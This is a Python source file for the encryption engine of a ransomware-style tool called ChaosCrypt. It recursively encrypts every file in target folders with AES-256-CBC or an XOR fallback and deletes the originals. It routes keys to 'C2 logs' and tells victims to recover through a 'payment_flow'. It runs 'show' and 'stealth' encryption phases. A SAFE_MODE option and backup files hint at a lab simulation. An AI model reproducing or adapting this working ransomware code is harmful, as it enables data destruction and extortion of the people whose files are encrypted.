"""
ChaosCrypt Encryptor — AES-256-CBC + Streaming Encryption Engine
==================================================================
AES-256-CBC шифрування з PKCS7 padding, random IV, SHA256 integrity.

  - AES-256-CBC з випадковим IV на кожен файл
  - PKCS7 padding
  - 32-байтний ключ (256 біт) з os.urandom
  - IV зберігається на початку зашифрованого файлу
  - SHA256 хеш оригіналу для верифікації після розшифровки
  - Atomic file operations (tmp -> rename)
  - Platform-native file locking (fcntl/msvcrt)
  - Backup оригіналу (.bak)
  - Disk space check перед шифруванням
  - Ключ НЕ зберігається в .meta (тільки в C2 логах)

Fallback: XOR-ROTATING якщо pycryptodome не встановлений.
"""

import os
import sys
import hashlib
import base64
import time
import json
import shutil
from chaoscrypt.settings import (
    ENCRYPTED_SUFFIX, METADATA_SUFFIX, BACKUP_SUFFIX, TMP_SUFFIX, LOCK_TIMEOUT,
    CHUNK_SIZE, SHOW_TARGET_DIR, STEALTH_TARGET_DIR, SAFE_MODE
)
from chaoscrypt.logbook import LogBook

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_AES = True
except ImportError:
    HAS_AES = False

_IS_WINDOWS = sys.platform.startswith("win")
if _IS_WINDOWS:
    try:
        import msvcrt
        HAS_NATIVE_LOCK = True
    except ImportError:
        HAS_NATIVE_LOCK = False
else:
    try:
        import fcntl
        HAS_NATIVE_LOCK = True
    except ImportError:
        HAS_NATIVE_LOCK = False

class InterProcessFileLock:

    def __init__(self, filepath):
        self.lockfile = filepath + ".lock"
        self._fd = None
        self._fp = None
        self.acquired = False

    def __enter__(self):
        start = time.time()
        self._fp = open(self.lockfile, 'w')
        self._fd = self._fp.fileno()

        while True:
            try:
                if HAS_NATIVE_LOCK:
                    if _IS_WINDOWS:
                        msvcrt.locking(self._fd, msvcrt.LK_NBLCK, 1)
                    else:
                        fcntl.flock(self._fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
                    self.acquired = True
                    return self
                else:
                    if os.path.exists(self.lockfile):
                        try:
                            age = time.time() - os.path.getmtime(self.lockfile)
                            if age > LOCK_TIMEOUT:
                                os.remove(self.lockfile)
                        except Exception:
                            pass
                    fd = os.open(self.lockfile, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
                    os.close(fd)
                    self.acquired = True
                    return self
            except (OSError, FileExistsError):
                if time.time() - start > LOCK_TIMEOUT:
                    self._cleanup()
                    raise TimeoutError(f"Could not acquire lock: {self.lockfile}")
                time.sleep(0.1)

    def __exit__(self, exc_type, exc_val, exc_tb):
        self._cleanup()

    def _cleanup(self):
        if HAS_NATIVE_LOCK and self._fp:
            try:
                if _IS_WINDOWS:
                    msvcrt.locking(self._fd, msvcrt.LK_UNLCK, 1)
                else:
                    fcntl.flock(self._fd, fcntl.LOCK_UN)
            except Exception:
                pass
        if self._fp:
            try:
                self._fp.close()
            except Exception:
                pass
            self._fp = None
        if os.path.exists(self.lockfile):
            try:
                os.remove(self.lockfile)
            except Exception:
                pass
        self.acquired = False

def gen_lab_key(length=32):
    return base64.urlsafe_b64encode(os.urandom(length)).decode("utf-8")


def gen_iv():
    return os.urandom(16)

def check_disk_space(filepath, required_bytes):
    try:
        stat = shutil.disk_usage(os.path.dirname(os.path.abspath(filepath)))
        needed = required_bytes * 2 + 1024 * 1024
        if stat.free < needed:
            raise IOError(
                f"Not enough disk space. Need {needed:,} bytes, "
                f"have {stat.free:,} bytes free."
            )
    except AttributeError:
        pass

def aes_encrypt_stream(in_fp, out_fp, key_bytes, with_hash=False):
    iv = gen_iv()
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)

    out_fp.write(iv)

    h = hashlib.sha256() if with_hash else None
    total = 0
    buffer = b""

    while True:
        chunk = in_fp.read(CHUNK_SIZE)
        if not chunk:
            break
        if h:
            h.update(chunk)
        total += len(chunk)
        buffer += chunk

        while len(buffer) >= AES.block_size:
            block_end = (len(buffer) // AES.block_size) * AES.block_size
            to_encrypt = buffer[:block_end]
            buffer = buffer[block_end:]
            out_fp.write(cipher.encrypt(to_encrypt))

    padded = pad(buffer, AES.block_size)
    out_fp.write(cipher.encrypt(padded))
    out_fp.flush()

    if with_hash:
        return h.hexdigest(), total
    else:
        return total


def aes_decrypt_stream(in_fp, out_fp, key_bytes, original_size=None):
    iv = in_fp.read(16)
    if len(iv) < 16:
        raise ValueError("Encrypted file too short — missing IV")

    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    encrypted_data = in_fp.read()
    if not encrypted_data:
        raise ValueError("Encrypted file is empty after IV")

    decrypted = cipher.decrypt(encrypted_data)

    try:
        decrypted = unpad(decrypted, AES.block_size)
    except ValueError as e:
        if original_size and 0 < original_size <= len(decrypted):
            if SAFE_MODE:
                decrypted = decrypted[:original_size]
            else:
                raise ValueError(
                    f"PKCS7 unpad failed and SAFE_MODE is off. "
                    f"Data may be corrupted or wrong key. Original error: {e}"
                )
        else:
            raise ValueError(
                f"Decryption failed: PKCS7 padding invalid. "
                f"Wrong key or corrupted data. Original error: {e}"
            )

    out_fp.write(decrypted)
    out_fp.flush()
    return len(decrypted)

def xor_stream(in_fp, out_fp, key_bytes, with_hash=False):
    key_len = len(key_bytes)
    chunk_id = 0
    total = 0
    h = hashlib.sha256() if with_hash else None
    while True:
        chunk = in_fp.read(CHUNK_SIZE)
        if not chunk:
            break
        if h:
            h.update(chunk)
        k = key_bytes[chunk_id % key_len:] + key_bytes[:chunk_id % key_len]
        chunk_id += 1
        out_fp.write(bytes(c ^ k[i % key_len] for i, c in enumerate(chunk)))
        total += len(chunk)
    out_fp.flush()
    if with_hash:
        return h.hexdigest(), total
    else:
        return total

def save_metadata(meta, enc_path):
    meta_path = enc_path + METADATA_SUFFIX
    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump(meta, f, indent=2)
    return meta_path

def load_metadata(enc_path):
    meta_path = enc_path + METADATA_SUFFIX
    if not os.path.isfile(meta_path):
        raise FileNotFoundError("No metadata file!")
    with open(meta_path, "r", encoding="utf-8") as f:
        return json.load(f)

class StreamingEncryptor:
    def __init__(self, phase):
        self.phase = phase
        self.logger = LogBook(phase=phase)
        self.algorithm = "AES-256-CBC" if HAS_AES else "XOR-ROTATING"

    def encrypt_file(self, filepath):
        abs_path = os.path.abspath(filepath)
        enc_path = abs_path + ENCRYPTED_SUFFIX
        tmp_path = enc_path + TMP_SUFFIX
        meta_path = enc_path + METADATA_SUFFIX
        backup_path = abs_path + BACKUP_SUFFIX
        result = None
        key_bytes = None
        sha256 = None
        orig_size = None

        try:
            file_size = os.path.getsize(abs_path)
            check_disk_space(abs_path, file_size)

            with InterProcessFileLock(abs_path):
                shutil.copy2(abs_path, backup_path)

                if HAS_AES:
                    key_b64 = gen_lab_key(32)
                    key_bytes = base64.urlsafe_b64decode(key_b64.encode("utf-8"))
                    with open(abs_path, "rb") as in_fp, open(tmp_path, "wb") as out_fp:
                        sha256, orig_size = aes_encrypt_stream(
                            in_fp, out_fp, key_bytes, with_hash=True
                        )
                else:
                    key_b64 = gen_lab_key(16)
                    key_bytes = base64.urlsafe_b64decode(key_b64.encode("utf-8"))
                    with open(abs_path, "rb") as in_fp, open(tmp_path, "wb") as out_fp:
                        sha256, orig_size = xor_stream(
                            in_fp, out_fp, key_bytes, with_hash=True
                        )

                meta = {
                    "original_file": os.path.basename(abs_path),
                    "original_size": orig_size,
                    "sha256": sha256,
                    "algorithm": self.algorithm,
                    "phase": self.phase,
                    "timestamp": time.time(),
                    "backup_path": backup_path,
                }

                if SAFE_MODE:
                    meta["key_b64"] = key_b64

                save_metadata(meta, enc_path)
                os.replace(tmp_path, enc_path)
                try:
                    os.remove(abs_path)
                except Exception:
                    pass

                self.logger.log_event("encryption", "Encrypted atomically",
                                      metadata={
                                          "file": enc_path, "meta": meta_path,
                                          "backup": backup_path, "key": key_b64,
                                          "algorithm": self.algorithm,
                                          "original_size": orig_size
                                      })
                result = enc_path, key_b64

        except IOError as e:
            self.logger.log_event("encryption",
                                  f"DISK SPACE ERROR: {abs_path}, {e}",
                                  tag="error",
                                  metadata={"file": abs_path, "error": str(e)})
        except Exception as e:
            self.logger.log_event("encryption",
                                  f"ERROR encrypting: {abs_path}, {e}",
                                  tag="error",
                                  metadata={"file": abs_path, "error": str(e)})
        finally:
            key_bytes = None
            if os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass
        return result

    def decrypt_file(self, encrypted_path, key_b64=None):
        abs_path = os.path.abspath(encrypted_path)
        tmp_path = abs_path + TMP_SUFFIX
        key_bytes = None
        result = False

        try:
            meta = load_metadata(abs_path)
            key = key_b64 or meta.get("key_b64")
            if not key:
                raise ValueError(
                    "No key available. Provide key via --key, payment_flow, "
                    "or enable SAFE_MODE for .meta key storage."
                )
            key_bytes = base64.urlsafe_b64decode(key.encode("utf-8"))
            orig_path = os.path.join(os.path.dirname(abs_path), meta["original_file"])
            algo = meta.get("algorithm", "XOR-ROTATING")

            enc_size = os.path.getsize(abs_path)
            check_disk_space(abs_path, enc_size)

            with InterProcessFileLock(abs_path):
                with open(abs_path, "rb") as in_fp, open(tmp_path, "wb") as out_fp:
                    if algo == "AES-256-CBC" and HAS_AES:
                        aes_decrypt_stream(
                            in_fp, out_fp, key_bytes,
                            original_size=meta.get("original_size")
                        )
                    else:
                        xor_stream(in_fp, out_fp, key_bytes)

            h = hashlib.sha256()
            length = 0
            with open(tmp_path, "rb") as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    h.update(chunk)
                    length += len(chunk)

            if h.hexdigest() == meta["sha256"] and length == meta["original_size"]:
                os.replace(tmp_path, orig_path)
                try:
                    os.remove(abs_path)
                except Exception:
                    pass
                try:
                    os.remove(abs_path + METADATA_SUFFIX)
                except Exception:
                    pass
                bak_path = meta.get("backup_path")
                if bak_path and os.path.exists(bak_path):
                    try:
                        os.remove(bak_path)
                    except Exception:
                        pass
                self.logger.log_event("recovery", "File recovered atomically",
                                      metadata={
                                          "file": orig_path, "key": key,
                                          "algorithm": algo
                                      })
                result = True
            else:
                self.logger.log_event("recovery",
                                      f"ERROR integrity mismatch: {abs_path}",
                                      tag="error",
                                      metadata={
                                          "file": abs_path,
                                          "expected_sha256": meta["sha256"],
                                          "actual_sha256": h.hexdigest(),
                                          "expected_size": meta["original_size"],
                                          "actual_size": length
                                      })
        except Exception as e:
            self.logger.log_event("recovery",
                                  f"ERROR decrypting: {abs_path}, {e}",
                                  tag="error",
                                  metadata={"file": abs_path, "error": str(e)})
        finally:
            key_bytes = None
            if os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass
        return result

    def encrypt_folder(self, folder_path, recursive=True, limit=None):
        abs_folder = os.path.abspath(folder_path)
        nenc = 0
        for root, dirs, files in os.walk(abs_folder):
            for fname in files:
                if fname.endswith(ENCRYPTED_SUFFIX):
                    continue
                if fname.endswith(METADATA_SUFFIX):
                    continue
                if fname.endswith(BACKUP_SUFFIX):
                    continue
                if fname.endswith(TMP_SUFFIX):
                    continue
                if fname.endswith(".lock"):
                    continue
                file_path = os.path.join(root, fname)
                res = self.encrypt_file(file_path)
                if res:
                    nenc += 1
                if limit and nenc >= limit:
                    return nenc
            if not recursive:
                break
        self.logger.log_event("encryption", "Folder encrypted",
                              metadata={
                                  "folder": abs_folder,
                                  "files_encrypted": nenc,
                                  "algorithm": self.algorithm
                              })
        return nenc

    def decrypt_folder(self, folder_path, key_b64=None, recursive=True, limit=None):
        abs_folder = os.path.abspath(folder_path)
        ndec = 0
        for root, dirs, files in os.walk(abs_folder):
            for fname in files:
                if not fname.endswith(ENCRYPTED_SUFFIX):
                    continue
                file_path = os.path.join(root, fname)
                if self.decrypt_file(file_path, key_b64):
                    ndec += 1
                if limit and ndec >= limit:
                    return ndec
            if not recursive:
                break
        self.logger.log_event("recovery", "Folder recovered",
                              metadata={
                                  "folder": abs_folder,
                                  "files_decrypted": ndec
                              })
        return ndec

    def close(self):
        self.logger.close()


if __name__ == "__main__":
    print(f"[ENCRYPTOR] Algorithm: {('AES-256-CBC' if HAS_AES else 'XOR-ROTATING (pip install pycryptodome)')}")
    print(f"[ENCRYPTOR] SAFE_MODE: {SAFE_MODE} (key in .meta: {SAFE_MODE})")
    print(f"[ENCRYPTOR] Native lock: {HAS_NATIVE_LOCK} ({'msvcrt' if _IS_WINDOWS else 'fcntl'})")

    encryptor_show = StreamingEncryptor("show")
    nenc = encryptor_show.encrypt_folder(SHOW_TARGET_DIR)
    print(f"[Show] Files encrypted: {nenc}")
    encryptor_show.close()

    encryptor_stealth = StreamingEncryptor("stealth")
    nenc2 = encryptor_stealth.encrypt_folder(STEALTH_TARGET_DIR)
    print(f"[Stealth] Files encrypted: {nenc2}")
    encryptor_stealth.close()